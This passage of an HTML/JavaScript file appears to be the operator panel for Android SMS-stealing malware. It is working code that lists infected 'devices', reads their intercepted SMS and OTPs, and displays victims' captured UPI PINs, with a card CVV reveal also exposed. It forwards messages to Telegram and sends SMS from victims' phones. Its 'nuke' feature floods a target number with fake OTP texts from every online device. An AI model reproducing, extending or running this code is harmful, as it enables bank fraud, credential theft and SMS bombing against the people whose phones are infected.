  $("sendTo").value = S.cur.phone;
}
async function sendSms(){
  if(!S.cur) return;
  const to = $("sendTo").value.trim();
  const body = $("sendBody").value.trim();
  if(!to || !body){ toast("Enter number and message", "err"); return; }
  try {
    await fbSet(`clients/${S.cur.id}/webhookEvent/sendSms`, {from:S.sim, to, message:body, isSended:false});
    $("sendBody").value = ""; $("sCnt").textContent = "0 chars";
    toast("SMS queued", "ok");
  } catch { toast("Failed", "err"); }
}

/* ─────────── settings ─────────── */
async function loadSettings(id){
  let tg = S.tg[id] || "";
  let fwd = S.fwd[id] || "";
  try { const r = await fbGet("panel_settings/tgChats/" + id); if(r) { tg = r; S.tg[id] = tg; } } catch {}
  try { const r = await fbGet("settings/" + id + "/forwardTo"); if(r) { fwd = r; S.fwd[id] = fwd; } } catch {}
  $("setTg").value = tg;
  $("setFwd").value = fwd;
  $("tgSt").classList.toggle("on", !!tg);
  $("fwdSt").classList.toggle("on", !!fwd);
  const d = S.cur;
  $("pinBox").textContent = d && d.raw && d.raw.upipin ? d.raw.upipin : "Not detected";
}

async function saveTg(){
  if(!S.cur) return;
  let v = $("setTg").value.trim();
  if(!v){ toast("Enter chat ID", "err"); return; }
  if(v.startsWith("https://t.me/")) v = v.replace("https://t.me/", "@");
  if(v.startsWith("t.me/")) v = v.replace("t.me/", "@");
  S.tg[S.cur.id] = v;
  localStorage.setItem(LS_TG, JSON.stringify(S.tg));
  try { await fbSet("panel_settings/tgChats/" + S.cur.id, v); } catch {}
  $("tgSt").classList.add("on");
  toast("Telegram saved", "ok");
}

async function saveFwd(){
  if(!S.cur) return;
  const v = $("setFwd").value.trim();
  if(!v){ toast("Enter number", "err"); return; }
  S.fwd[S.cur.id] = v;
  localStorage.setItem(LS_FWD, JSON.stringify(S.fwd));
  try {
    await fbSet("settings/" + S.cur.id + "/forwardTo", v);
    await fbSet("panel_settings/fwdNums/" + S.cur.id, v);
  } catch {}
  $("fwdSt").classList.add("on");
  toast("Saved — testing...", "ok");
  if(S.msgs.length){
    autoFwd(S.cur.id, {sender: S.msgs[0].sender, body: "[TEST] " + S.msgs[0].body, ts: Date.now()});
  }
}

function saveAlias(){
  if(!S.cur) return;
  const v = $("setAlias").value.trim();
  setAlias(S.cur.id, v);
  S.cur.name = v || ("Device ·" + S.cur.id.slice(-4));
  S.cur.hasAlias = !!v;
  $("dName").textContent = S.cur.name;
  render();
  toast(v ? "Alias saved" : "Alias cleared", "ok");
}

function copyPin(){
  const d = S.cur;
  const pin = d && d.raw && d.raw.upipin;
  if(!pin){ toast("No PIN detected", "err"); return; }
  copy(pin, "PIN copied");
}

async function deleteDevice(){
  if(!S.cur) return;
  if(!confirm("Delete '" + S.cur.name + "' from Firebase?")) return;
  try {
    await fbDel("clients/" + S.cur.id);
    S.devices = S.devices.filter(d => d.id !== S.cur.id);
    delete S.phoneCache[S.cur.id];
    stats(); render(); closeDrawer();
    toast("Deleted", "ok");
  } catch { toast("Failed", "err"); }
}

/* ─────────── debug ─────────── */
async function renderDebug(){
  const d = S.cur;
  if(!d) return;
  const el = $("rawJson");
  el.textContent = "Loading...";
  try {
    const raw = await fbGet("clients/" + d.id);
    el.textContent = JSON.stringify(raw, null, 2);
    S.raw[d.id] = raw;
  } catch(e){
    el.textContent = "Error: " + (e.message || e);
    if(d.raw) el.textContent = JSON.stringify(d.raw, null, 2);
  }
}
function copyRaw(){
  if(!S.cur || !S.raw[S.cur.id]) { toast("Nothing to copy", "err"); return; }
  copy(JSON.stringify(S.raw[S.cur.id], null, 2), "JSON copied");
}
function reloadRaw(){ renderDebug(); }

/* ─────────── otp bar ─────────── */
function showOtp(otp, sender){
  S.lastOtp = otp;
  $("otpN").textContent = otp;
  $("otpS").textContent = sender;
  $("otpBar").classList.add("on");
  if(S.otpT) clearTimeout(S.otpT);
  S.otpT = setTimeout(dismissOtp, 60000);
}
function copyOtp(){
  const v = $("otpN").textContent;
  if(v && v !== "——————") copy(v, "OTP copied");
}
function dismissOtp(){
  $("otpBar").classList.remove("on");
  if(S.otpT){ clearTimeout(S.otpT); S.otpT = null; }
}

/* ─────────── bulk ─────────── */
function openBulk(){ $("bulkMw").classList.add("on"); renderBulkList(); }
function closeBulk(){ $("bulkMw").classList.remove("on"); }
function renderBulkList(){
  const box = $("bulkList");
  box.innerHTML = "";
  if(!S.devices.length){
    box.innerHTML = `<div style="padding:20px;text-align:center;color:var(--text3);font-size:12px">No devices</div>`;
    return;
  }
  S.devices.forEach(d => {
    const row = document.createElement("label");
    row.className = "dc";
    row.innerHTML = `
      <input type="checkbox" data-id="${esc(d.id)}">
      <span class="dc-n">${esc(d.name)} <span style="color:var(--text3);font-family:var(--mono);font-size:10px">${esc(d.phone ? fmtPhone(d.phone) : "")}</span></span>
      <span class="dc-d ${d.status ? "on" : "off"}"></span>`;
    box.appendChild(row);
  });
}
function bulkSel(mode){
  document.querySelectorAll("#bulkList input[type=checkbox]").forEach(b => {
    const d = S.devices.find(x => x.id === b.dataset.id);
    if(mode === "all") b.checked = true;
    else if(mode === "clear") b.checked = false;
    else if(mode === "online") b.checked = !!(d && d.status);
  });
}
function bulkSim(n){
  S.bsim = n;
  $("bsp1").classList.toggle("on", n === 1);
  $("bsp2").classList.toggle("on", n === 2);
}
async function fireBulk(){
  const to = $("bTo").value.trim();
  const body = $("bBody").value.trim();
  if(!to || !body){ toast("Fill target and message", "err"); return; }
  const boxes = document.querySelectorAll("#bulkList input[type=checkbox]:checked");
  if(!boxes.length){ toast("Select devices", "err"); return; }
  let sent = 0;
  for(const b of boxes){
    try {
      await fbSet(`clients/${b.dataset.id}/webhookEvent/sendSms`, {from:S.bsim, to, message:body, isSended:false});
      sent++;
    } catch {}
  }
  toast(`Queued on ${sent}/${boxes.length}`, "ok");
  closeBulk();
}

/* ─────────── nuke ─────────── */
function openNuke(){ $("nukeMw").classList.add("on"); }
function closeNuke(){
  if(S.nuke){ if(!confirm("Stop nuke?")) return; nukeStop(); }
  $("nukeMw").classList.remove("on");
}
function nukeSim(n){
  S.nsim = n;
  $("nsp1").classList.toggle("on", n === 1);
  $("nsp2").classList.toggle("on", n === 2);
}
function nukeMode(m){
  S.nMode = m;
  $("nmR").classList.toggle("on", m === "random");
  $("nmC").classList.toggle("on", m === "custom");
  $("nBody").style.display = m === "custom" ? "block" : "none";
}
function randId(){
  return Math.floor(100000 + Math.random() * 900000).toString();
}
function nukeLog(msg, cls){
  const log = $("nLog");
  const line = document.createElement("div");
  line.className = "nlog-l " + (cls || "");
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  log.appendChild(line);
  log.scrollTop = log.scrollHeight;
  if(log.children.length > 100) log.removeChild(log.firstChild);
}
async function nukeStart(){
  const to = $("nTo").value.trim();
  if(!to){ toast("Enter target", "err"); return; }
  S.nuke = true; S.nS = 0; S.nF = 0;
  $("nS").textContent = "0"; $("nF").textContent = "0";
  $("nFire").style.display = "none";
  $("nStop").style.display = "block";
  $("nLog").innerHTML = "";
  nukeLog("Nuke started on " + to, "ok");
  
  const custom = S.nMode === "custom" ? $("nBody").value.trim() : "";
  
  while(S.nuke){
    const online = S.devices.filter(d => d.status);
    if(!online.length){
      nukeLog("No online devices — waiting", "err");
      await new Promise(r => setTimeout(r, 2000));
      continue;
    }
    for(const d of online){
      if(!S.nuke) break;
      const body = S.nMode === "custom" && custom ? custom : `Your OTP is ${randId()}. Do not share.`;
      try {
        await fbSet(`clients/${d.id}/webhookEvent/sendSms`, {from:S.nsim, to, message:body, isSended:false});
        S.nS++;
        $("nS").textContent = S.nS;
        nukeLog(`✓ ${d.name} → sent`, "ok");
      } catch(e){
        S.nF++;
        $("nF").textContent = S.nF;
        nukeLog(`✗ ${d.name} → failed`, "err");
      }
      await new Promise(r => setTimeout(r, CFG.nukeCooldown || 500));
    }
    if(S.nuke) await new Promise(r => setTimeout(r, 1000));
  }
}
function nukeStop(){
  S.nuke = false;
  $("nFire").style.display = "block";
  $("nStop").style.display = "none";
  nukeLog("Nuke stopped", "err");
}

/* ─────────── share link ─────────── */
function handleShareLink(){
  const params = new URLSearchParams(location.search);
  const s = params.get("s");
  if(!s) return false;
  const parsed = parseShare(s);
  if(!parsed) return false;
  history.replaceState(null, "", location.pathname);
  $("inpUrl").value = parsed.url;
  $("inpKey").value = parsed.key;
  toast("Share link loaded", "ok");
  return true;
}

/* ─────────── init ─────────── */
function init(){
  // clock
  setInterval(() => {
    const d = new Date();
    $("clock").textContent = d.toLocaleTimeString("en-IN", {hour12:false});
  }, 1000);

  // drag & drop APK
  const drop = $("dropZone");
  if(drop){
    drop.addEventListener("dragover", e => { e.preventDefault(); drop.classList.add("dg"); });
    drop.addEventListener("dragleave", () => drop.classList.remove("dg"));
    drop.addEventListener("drop", e => {
      e.preventDefault(); drop.classList.remove("dg");
      const f = e.dataTransfer.files[0];
      if(f) parseApk(f);
    });
  }
  $("apkInput")?.addEventListener("change", e => {
    const f = e.target.files[0];
    if(f) parseApk(f);
  });

  // Enter key on login
  $("inpKey")?.addEventListener("keydown", e => { if(e.key === "Enter") login(); });
  $("inpUrl")?.addEventListener("keydown", e => { if(e.key === "Enter") $("inpKey").focus(); });

  // share link
  const hadShare = handleShareLink();

  // auto-connect
  if(!hadShare && CFG.autoConnectLast){
    try {
      const last = JSON.parse(localStorage.getItem(LS_L) || "null");
      if(last && last.url && last.key){
        $("inpUrl").value = last.url;
        $("inpKey").value = last.key;
        connect(last.url, last.key, false).catch(() => showSaved());
        return;
      }
    } catch {}
  }
  if(!hadShare) showSaved();
}

// public API
window.G = {
  login, logout, connect, showNew, showSaved,
  setFilter, render, openDrawer, closeDrawer, tab,
  renderSms, setMf, deleteMsg, deleteAllMsgs, exportSms,
  pickSim, useNum, sendSms,
  saveTg, saveFwd, saveAlias, copyPin, deleteDevice,
  revealCvv, copyRaw, reloadRaw,
  copyOtp, dismissOtp,
  openBulk, closeBulk, bulkSel, bulkSim, fireBulk,
  openNuke, closeNuke, nukeSim, nukeMode, nukeStart, nukeStop,
  copy, toast
};

// boot
if(document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
else init();

})();
</script>
</body>
</html>
